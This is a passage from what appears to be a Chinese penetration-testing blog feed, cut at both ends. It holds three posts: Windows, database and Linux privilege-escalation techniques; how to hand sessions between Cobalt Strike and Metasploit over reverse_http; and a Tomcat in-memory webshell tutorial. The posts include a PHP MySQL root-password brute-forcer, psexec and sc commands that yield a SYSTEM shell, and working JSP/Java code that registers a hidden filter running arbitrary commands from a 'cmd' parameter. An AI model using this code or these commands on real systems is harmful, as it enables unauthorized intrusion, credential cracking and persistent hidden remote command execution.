class="built_in">cmd</span>服务</span><br><span class="line">sc <span class="built_in">start</span> syscmd #得到了system权限的<span class="built_in">cmd</span>环境</span><br><span class="line">适用版本：windows <span class="number">7</span>、<span class="number">8</span>、<span class="number">03</span>、<span class="number">08</span></span><br></pre></td></tr></table></figure><ul><li><strong>PS命令提权</strong> </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">微软工具包：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br><span class="line">psexec.exe -accepteula -s -i -d <span class="built_in">cmd</span>.exe</span><br><span class="line">适用版本：Win2003 &amp; Win2008</span><br></pre></td></tr></table></figure><h2 id="0x03-数据库提权"><a href="#0x03-数据库提权" class="headerlink" title="0x03 数据库提权"></a>0x03 数据库提权</h2><ul><li><p><strong>Mysql数据库提权</strong> </p><p><strong>UDF提权</strong></p><p>在利用<strong>UDF提权时前提是我们需要知道数据库的密码</strong>，而在正常情况下MySQL数据库不支持外连，此时如果我们用工具爆破不了，可以上传脚本进行爆破，脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Mysql账号密码爆破工具&lt;/title&gt;</span><br><span class="line">  &lt;m eta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;center&gt;</span><br><span class="line">   &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;h1&gt;MysqlDatab aseBlasting(Mysql账号密码在线爆破工具 V1.0)&lt;/h1&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"> if(@$_POST[&apos;submit&apos;])&#123;</span><br><span class="line">   $host = @$_POST[&apos;host&apos;];</span><br><span class="line">   if($host!=&quot;&quot;)&#123;</span><br><span class="line">    $username = &quot;root&quot;;//用户名字典</span><br><span class="line">    $password = array(&apos;&apos;,&apos;123456&apos;,&apos;admin&apos;,&apos;root123&apos;,&apos;ccf304vn&apos;); //密码字典</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;hr&gt;&lt;br&gt;--------------------爆破状态--------------------&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;密码错误次数：&quot;;</span><br><span class="line">    for ($i=0; $i &lt;= count($password); $i++) &#123;</span><br><span class="line">     if(@mysql_connect($host, $username, $password[$i]))&#123;</span><br><span class="line">       echo &quot;&lt;br&gt;&lt;br&gt;&lt;font color=&apos;red&apos;&gt;爆破成功--密码--&gt;&quot;.@$password[$i].&quot;&lt;/font&gt;&quot;;</span><br><span class="line">       break;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">       echo $i.&quot;、&quot;;</span><br><span class="line">       continue;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br&gt;--------------------爆破结束--------------------&lt;br&gt;&lt;hr&gt;&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;黑客，输入数据库IP地址&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form action=&quot;MysqlDatab aseBlasting.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">   数据库IP地址:&lt;input type=&quot;text&quot; name=&quot;host&quot;/&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;爆破&quot; name=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>参考： <a href="https://blog.csdn.net/qq_36119192/article/details/84863268" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84863268</a> </p></li><li><p><strong>Mssql数据库提权</strong> </p><p>参考： <a href="https://www.cnblogs.com/N0r4h/p/12889944.html" target="_blank" rel="noopener">https://www.cnblogs.com/N0r4h/p/12889944.html</a> </p></li><li><p><strong>Oracle数据库提权</strong> </p><ul><li><strong>普通用户模式</strong>：前提是拥有一个普通的Oracle连接账号，不需要DBA，并以Oracle实例运行的权限执行操作系统命令。 </li><li><strong>DBA用户模式</strong>：拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。 </li><li><strong>注入提升模式</strong>： 拥有一个Oracle注入点，可以通过注入点执行系统命令，此种模式没有实现回显，需要自己验证。</li></ul><p>一般Oracle数据库利用这个工具进行提权（自带以上三种提权方式）： 下载地址:<a href="https://github.com/jas502n/oracleShell" target="_blank" rel="noopener">https://github.com/jas502n/oracleShell</a> </p></li></ul><h2 id="0x04-Linux提权"><a href="#0x04-Linux提权" class="headerlink" title="0x04 Linux提权"></a>0x04 Linux提权</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、信息收集脚本-LinEnum-master：https://github.com/rebootuser/LinEnum</span><br><span class="line"><span class="number">2</span>、漏洞探针脚本，获取可能存在的漏洞-linux-exploit-suggester：https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line"><span class="number">3</span>、在进行linux提权时，推荐使用冰蝎，因为冰蝎里面有很多集成化功能，可以反弹shell到msf中-下载地址：https://github.com/rebeyond/Behinder</span><br></pre></td></tr></table></figure><ul><li><p><strong>SUID提权</strong></p></li><li><p><strong>内核漏洞提权</strong> </p><p>在内核漏洞提权时，前提要是本地用户才能进行提权。请参考：<a href="https://www.moonsec.com/archives/379" target="_blank" rel="noopener">https://www.moonsec.com/archives/379</a> </p></li><li><p><strong>脏牛提权</strong></p><p>请参考：<a href="https://www.cnblogs.com/xiaozi/p/13370721.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/13370721.html</a> </p></li><li><p><strong>定时任务提权</strong> </p><p>请参考：<a href="https://www.yidc.net/archives/4380" target="_blank" rel="noopener">https://www.yidc.net/archives/4380</a> </p></li><li><p><strong>环境变量提权</strong>  </p><p>请参考：<a href="https://www.freebuf.com/articles/system/173903.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/173903.html</a> </p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;提权总结&quot;&gt;&lt;a href=&quot;#提权总结&quot; class=&quot;headerlink&quot; title=&quot;提权总结&quot;&gt;&lt;/a&gt;提权总结&lt;/h1&gt;&lt;p&gt;转载自：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>CS与MSF互转</title>
    <link href="http://bai-ren-1.github.io/2021/07/13/CS%E4%B8%8EMSF%E4%BA%92%E8%BD%AC/"/>
    <id>http://bai-ren-1.github.io/2021/07/13/CS%E4%B8%8EMSF%E4%BA%92%E8%BD%AC/</id>
    <published>2021-07-13T03:10:31.000Z</published>
    <updated>2021-07-13T03:13:54.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CS与MSF互转"><a href="#CS与MSF互转" class="headerlink" title="CS与MSF互转"></a>CS与MSF互转</h1><p>转载自：<a href="https://mp.weixin.qq.com/s/wyy42T0wPkpZBxbBsjcEmA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wyy42T0wPkpZBxbBsjcEmA</a></p><h2 id="0x00-MSF转CS"><a href="#0x00-MSF转CS" class="headerlink" title="0x00 MSF转CS"></a>0x00 MSF转CS</h2><p>在cs中配置新监听器，beacon_http即可，设置好监听ip和端口；</p><p>使用msf payload_inject模块注入一个新的cs的shell：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost cs的ip</span><br><span class="line"><span class="built_in">set</span> lport cs的port</span><br><span class="line"><span class="built_in">set</span> session 需要转换的session编号</span><br><span class="line"><span class="built_in">set</span> disablepayloadhandler true</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="0x01-CS转MSF"><a href="#0x01-CS转MSF" class="headerlink" title="0x01 CS转MSF"></a>0x01 CS转MSF</h2><p> 在msf中开启通常的监听：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost xx.xx.xx.xx</span><br><span class="line"><span class="built_in">set</span> lport xxxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在cs中选择已存在的shell，右键-&gt;spawn；</p><p>选择foreign类型的监听器，填写msf的ip和端口；</p><p>选择此监听器转换shell到msf</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CS与MSF互转&quot;&gt;&lt;a href=&quot;#CS与MSF互转&quot; class=&quot;headerlink&quot; title=&quot;CS与MSF互转&quot;&gt;&lt;/a&gt;CS与MSF互转&lt;/h1&gt;&lt;p&gt;转载自：&lt;a href=&quot;https://mp.weixin.qq.com/s/wyy42T
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存马</title>
    <link href="http://bai-ren-1.github.io/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://bai-ren-1.github.io/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2021-07-11T03:29:15.000Z</published>
    <updated>2021-07-12T08:49:34.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><ul><li>filter型</li><li>servlet型</li><li>listener型</li></ul><p>执行优先级是listener -&gt; filter -&gt; servlet</p><p>抄自：<a href="https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ</a></p><h2 id="0x00-filter型内存马"><a href="#0x00-filter型内存马" class="headerlink" title="0x00 filter型内存马"></a>0x00 filter型内存马</h2><h3 id="00-原理"><a href="#00-原理" class="headerlink" title="00 原理"></a>00 原理</h3><p>filter是javaweb中的过滤器，会对客户端发送的请求进行过滤并做一些操作，我们可以<strong>在filter中写入命令执行的恶意文件，让客户端发来的请求通过它来做命令执行</strong>。</p><p>而filter内存马是通过<strong>动态注册一个恶意filter</strong>，由于是动态注册的，所以这个filter没有文件实体，存在于内存中，随着tomcat重启而消失。</p><p>一般我们把这个filter放在所有filter最前面优先执行，这样我们的请求就不会受到其他正常filter的干扰。</p><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><p>需要<strong>动态注册filter</strong>就需要几个添加filter相关的函数，ServletContext恰好可以满足这个条件</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.ServletContext</span><br></pre></td></tr></table></figure><p>ServletContext的方法中有addFilter、addServlet、addListener方法，即添加Filter、Servlet、Listener</p><p>获取ServletContext的方法</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.getServletContext(); <span class="keyword">this</span>.getServletConfig().getServletContext();</span><br></pre></td></tr></table></figure><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>在Tomcat中org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现</p><p>所以需要import这个库，最后我们用到它获取Context</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br></pre></td></tr></table></figure><h4 id="filter相关变量"><a href="#filter相关变量" class="headerlink" title="filter相关变量"></a>filter相关变量</h4><ul><li>filterMaps变量：包含所有过滤器的URL映射关系；</li><li>filterDefs变量：包含所有过滤器包括实例内部等变量；</li><li>filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理：</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationFilterConfig"</span> %&gt;</span><br></pre></td></tr></table></figure><p>在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterDef"</span> %&gt;</span><br></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;</span><br></pre></td></tr></table></figure><h3 id="01-实现"><a href="#01-实现" class="headerlink" title="01 实现"></a>01 实现</h3><h4 id="filter部分"><a href="#filter部分" class="headerlink" title="filter部分"></a>filter部分</h4><p>先通过一个简单的filter来看一下结构 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"init filter"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"exec filter"</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filterDemo中有init、doFilter、destroy三个重要方法 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init()方法：初始化参数，在创建Filter时自动调用，当我们需要设置初始化参数的时候，可以写到该方法中。</span><br><span class="line">doFilter()方法：拦截到要执行的请求时，doFilter就会执行。这里面写我们对请求和响应的预处理</span><br><span class="line">destory()方法：在销毁Filter时自动调用</span><br></pre></td></tr></table></figure><p>对我们来说，init和destory不需要做什么，只需要写一个doFilter方法拦截需要的请求，将其参数用于Runtime.getRuntime().exec()做命令执行，并将返回的数据打印到Response中即可，如下例： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">     String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">     <span class="keyword">if</span> (cmd!= <span class="keyword">null</span>) &#123;</span><br><span class="line">         Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">         java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                 <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">         StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">         String line;</span><br><span class="line">         <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">             stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">         servletResponse.getOutputStream().flush();</span><br><span class="line">         servletResponse.getOutputStream().close();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="动态注册部分"><a href="#动态注册部分" class="headerlink" title="动态注册部分"></a>动态注册部分</h4><p>filter部分写好，下一步就是实现将其注入到内存中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line"></span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">String name = <span class="string">"filterDemo"</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo这个filter，如果没有则准备创建</span></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line">    filterDemo filter = <span class="keyword">new</span> filterDemo();</span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//添加filterDef</span></span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern("/*");</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">"/xyz"</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line">    Constructor constructor = ApplicationFilterConfig<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="title">Context</span>.<span class="title">class</span>, <span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">    filterConfigs.put(name,filterConfig);</span><br><span class="line">    out.write(<span class="string">"Inject success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">"Injected!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整filter内存马"><a href="#完整filter内存马" class="headerlink" title="完整filter内存马"></a>完整filter内存马</h4><p>最终jsp文件将其命名为1.jsp，然后只需<strong>传到web目录并访问一次jsp文件，然后再将/1.jsp换成/xyz?cmd=whoami</strong>访问即可 ：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.Context"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationFilterConfig"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tomcat 8/9 和 tomcat自己按实际选择使用，不用的就注释起来</span></span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterDef"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterDef"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.*"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Constructor"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> 